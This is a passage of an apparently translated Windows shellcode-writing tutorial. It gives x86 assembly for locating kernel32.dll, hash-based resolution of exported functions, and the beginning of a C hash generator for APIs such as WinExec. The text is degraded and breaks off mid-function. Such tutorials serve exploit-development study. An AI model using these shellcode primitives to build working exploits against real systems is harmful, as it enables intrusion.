xor ax,ax ;Zerothelowerhalf
cmp word[eax],0x5a4d ;Isthisthetopofkernel32?
jne find_kernel32_base_loop ;Nope? Tryagain.
find_kernel32_base_finished:
pop ecx ;Restoreecx
pop esi ;Restoreesi
ret ;Return(ifnotusedinline)
一样，如果一切顺利的话，kernel32.dll的地址将会放入eax
注意：cmpword[eax],0x5a4d：0x5a4d=MZ（签名，用作MSDOS16位程序格式）。Kernel32
文件从这个签名开头，因此这是决定dll头部的一种方法）
TTTTOOOOPPPPSSSSTTTTAAAACCCCKKKK（TTTTEEEEBBBB）
（大小：23字节，null字节：无）
find_kernel32:
pushesi ;Saveesi
xor esi,esi ;Zeroesi
mov eax,[fs:esi+0x4] ;ExtractTEB
mov eax,[eax-0x1c] ;Snagafunctionpointerthat's0x1cbytesintothestack
find_kernel32_base:
find_kernel32_base_loop:
dec eax ;Subtracttoournextpage
xor ax,ax ;Zerothelowerhalf
cmp word[eax],0x5a4d ;Isthisthetopofkernel32?
jne find_kernel32_base_loop ;Nope? Tryagain.
find_kernel32_base_finished:
pop esi ;Restoreesi
ret ;Return(ifnotusedinline)
当一切顺利的话kernel32.dll的基地址会被加载进eax。
注意：Skape写了小工具（c源代码能在这里找到here)来使我们构造一个通用的新的 shellcode框架，
包含了找kernel32.dll和dll中的函数的代码）
这章应该提供给你必要的工具和动态定位kernel32.dll的基地址的知识，并将它放到寄存器
中。让我们继续。
解析符号表////找符号表地址
一旦我们已经得到了kernel32.dll的基地址，我们就能用它来使我们的exploit更加动态
和更好的移植性。
我们需要加载其他的链接库，并且需要通过解析链接库来得到我们的shellcode里面调用
函数的地址。
解析函数地址可以用GetProcAddress（）（kernel32.dll里面的一个函数）简单地得到。唯
一的问题是：我们怎样才能动态调用GetProcAddress（）？毕竟，我们不能用GetProcAddress
（）来找GetProcAddress（）:-)
查询导入表
每个dll可执行程序映像都有一个导入表，里面包含了导入符号的数目，函数数组的相
对虚拟地址（RVA），符号名数组，序数数组（并且有一个1对1匹配的导入符号索引）。
为了解析一个符号，我们可以遍历导入表：详细检查符号名数组看符号的名字是不是和
我们要找的符号相匹配。可以通过全名（字符串）来匹配名字（会增加代码的大小），或者
你也可以创建一个你找的字符串的哈希，然后将这个哈希和符号名数组里的符号哈希相比
较。（比较喜欢的方法）
当哈希匹配时，函数的实际虚拟地址可以这样计算：
索引关于序数数组细节的符号
给定索引的序数数组的值和函数数组共同得到符号的相对虚拟地址
将相对虚拟地址加上基地址，你将会得到函数的VMA（虚拟内存地址）
这种技术是通用的并且对任何dll的任何函数都有效--而不是只针对kernel32.dll。因此一
旦你已经从kernel32.dll中解析LoadLibraryA，你可以用这种通用的，动态的技术来找到任
意dll中的任意函数的地址。
在用find_function代码前先设置：
1、决定你要定位的函数的哈希值（并确信你知道它属于哪个模块）（创建函数的哈希值
将会在这章的后面--现在不要太担心这个）
2、得到模块基地址。如果模块不是kernel32.dll，你需要
首先获得kernel32.dll的基地址（看前面）
从kernel32.dll中找到LoadLibraryA函数（用后面的代码）
用LoadLibraryA来加载其他模块并得到它的基地址（我们会在一会儿讨论这个）
用这个基地址来定位这个模块的函数
3、将要求的函数名的哈希值入栈
4、将模块的基地址入栈
这个找函数地址的汇编代码是这样的：
（大小：78字节，null字节：无）
find_function:
pushad ;saveallregisters
mov ebp, [esp + 0x24] ;putbaseaddressofmodulethatisbeing
;loadedinebp
mov eax, [ebp + 0x3c] ;skipoverMSDOSheader
mov edx, [ebp + eax + 0x78];gotoexporttableandputrelativeaddress
;inedx
add edx, ebp ;addbaseaddresstoit.
;edx=absoluteaddressofexporttable
mov ecx, [edx + 0x18] ;setupcounterECX
;(howmanyexporteditemsareinarray?)
mov ebx, [edx + 0x20] ;putnamestablerelativeoffsetinebx
add ebx, ebp ;addbaseaddresstoit.
;ebx=absoluteaddressofnamestable
find_function_loop:
jecxz find_function_finished ;ifecx=0,thenlastsymbolhasbeenchecked.
;(shouldneverhappen)
;unlessfunctioncouldnotbefound
dec ecx ;ecx=ecx-1
mov esi, [ebx + ecx * 4] ;getrelativeoffsetofthenameassociated
;withthecurrentsymbol
;andstoreoffsetinesi
add esi, ebp ;addbaseaddress.
;esi=absoluteaddressofcurrentsymbol
compute_hash:
xor edi, edi ;zerooutedi
xor eax, eax ;zeroouteax
cld ;cleardirectionflag.
;willmakesurethatitincrementsinsteadof
;decrementswhenusinglods*
compute_hash_again:
lodsb ;loadbytesatesi(currentsymbolname)
;intoal,+incrementesi
test al, al ;bitwisetest:
;seeifendofstringhasbeenreached
jz compute_hash_finished ;ifzeroflagisset=endofstringreached
ror edi, 0xd ;ifzeroflagisnotset,rotatecurrent
;valueofhash13bitstotheright
add edi, eax ;addcurrentcharacterofsymbolname
;tohashaccumulator
jmp compute_hash_again ;continueloop
compute_hash_finished:
find_function_compare:
cmp edi, [esp + 0x28] ;seeifcomputed hashmatchesrequestedhash(at
esp+0x28)
jnz find_function_loop ;nomatch,gotonextsymbol
mov ebx, [edx + 0x24] ;ifmatch:extractordinalstable
;relativeoffsetandputinebx
add ebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofordinalsaddresstable
mov cx, [ebx + 2 * ecx] ;getcurrentsymbolordinalnumber(2bytes)
mov ebx, [edx + 0x1c] ;getaddresstablerelativeandputinebx
add ebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofaddresstable
mov eax, [ebx + 4 * ecx] ;get relative function offsetfrom its ordinaland
putineax
add eax, ebp ;addbaseaddress.
;eax=absoluteaddressoffunctionaddress
mov [esp + 0x1c], eax ;overwritestackcopyofeaxsopopad
;willreturnfunctionaddressineax
find_function_finished:
popad ;retrieveoriginalregisters.
;eaxwillcontainfunctionaddress
ret ;onlyneededifcodewasnotusedinline
假设你将指向哈希值的指针入栈，你可以用这个代码来加载find_function：
popesi ;takepointertohashfromstackandputitinesi
lodsd ;loadthehashitselfintoeax(pointedtobyesi)
pusheax ;pushhashtostack
pushedx ;pushbaseaddressofdlltostack
callfind_function
（正如你能看到的，这个模块基地址应该在edx中）
当find_function返回时，函数地址将会在eax中。
如果你需要在你的程序中找多个函数，能够做到的其中一些技术是这样的：
在栈上分配空间（每个函数4个字节）然后将esp值传给ebp。每个函数地址将会在栈
中一个挨着一个，根据你定义的顺序
对涉及到的每个dll，得到基地址然后再dll中找到需要的函数：
在find_function函数周围弄一个循环并将函数地址写入ebp+4,ebp+8，等等（所以在
最后，API指针将会写入你控制的位置，因此你可以用寄存器的偏移量来调用它们（在我们
的例子中是ebp）
我们会在稍后的例子中用到这个技术：
你应该很重要地注意到用哈希值来定位函数指针的技术是通用的。这意味着我们根本不必用
GetProcAddress（）。
你可以再这里找到更多的信息here。
创建哈希
在前一章中我们已经学了怎样用比较哈希值的方法来定位函数地址。
当然，在比较哈希值之前，我们要先产生哈希值:-)
你可以自己用一些可用的asm代码来产生哈希，asm代码可以在projectshellcode网站上
找到。（明显你不需要在你的exploit种包括这个代码--你只要产生哈希值，因此你可以在你
的exploit代码中用它们）
在用nasm装配完代码后，用pveReadbin.pl来导入字节并将字节放到testshellcode.c程序
中，我们也可以为一些函数产生哈希值。（这些哈希值只是基于函数名字符串，因此你当然
能用函数来扩大/修改列表（只是在代码底部修改函数名））。记住函数名可能是大小写敏感
的！
正如projectshellcode网站上所陈述的，已经编译好的源代码实际上不会在命令行上提供
任何输出。你只要通过调试器运行程序，然后函数名+哈希值将会一个接一个地放入栈中：
这很好，但是可能更好的产生哈希值的方法是用c脚本（我的朋友Ricardo写的（我只是调
节了一点点--所有发明权归Ricardo）（GenerateHash.c）
#include
longrol(longvalue,intn);
longror(longvalue,intn);
longcalculate_hash(char*function_name);
voidbanner();
intmain(intargc,char*argv[])
{
banner();
if(argc<2)
{
inti=0;
char*func[]=
{
"FatalAppExitA",
"LoadLibraryA",
"GetProcAddress",
"WriteFile",
"CloseHandle",
"Sleep",
"ReadFile",
"GetStdHandle",
"CreatePipe",
"SetHandleInformation",
"WinExec",
"ExitProcess",
0x0
};
printf("HASH\t\t\tFUNCTION\n----\t\t\t--------\n");
while(*func)
{
printf("0x%X\t\t%s\n",calculate_hash(*func),*func);
i++;